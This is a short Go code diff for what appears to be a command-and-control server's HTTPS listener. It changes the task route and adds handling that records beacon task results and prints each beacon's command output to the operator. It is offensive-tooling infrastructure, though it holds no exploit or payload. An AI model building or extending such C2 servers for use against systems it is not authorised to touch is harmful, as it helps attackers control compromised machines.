@@ -46,7 +46,7 @@ func (l *HttpsListener) Start() {
 	beaconApi := r.PathPrefix("/").Subrouter()
 
 	beaconApi.HandleFunc("/register", RegisterBeaconHandler).Methods("POST")
-	beaconApi.HandleFunc("/tasks/{beaconId}", GetTasksHandler).Methods("GET")
+	beaconApi.HandleFunc("/tasks", GetTasksHandler).Methods("GET")
 	beaconApi.HandleFunc("/results/{beaconId}", PostResultsHandler).Methods("POST")
 
 	tlsConfig := &tls.Config{
@@ -111,6 +111,18 @@ func PostResultsHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	// Update task
+	for i := 0; i < len(core.Tasks); i++ {
+		if core.Tasks[i].TaskID == TaskRes.TaskID {
+			core.Tasks[i] = TaskRes
+		}
+	}
+	// Display to operator
+	fmt.Printf("%s [%s] Beacon called back home, received %d bytes\n", util.PrintStatus, TaskRes.BeaconID, len(TaskRes.Output))
+	if TaskRes.Status == "failed" {
+		fmt.Printf("%s Task <%s> failed: %s\n", util.PrintBad, TaskRes.Command, TaskRes.Output)
+	} else if TaskRes.Status == "success" {
+		fmt.Printf("%s Task <%s> success: %s\n", util.PrintGood, TaskRes.Command, TaskRes.Output)
+	}
 }
 
 // Sends Next Waiting Task to Agent from oldest -> latest FIFO
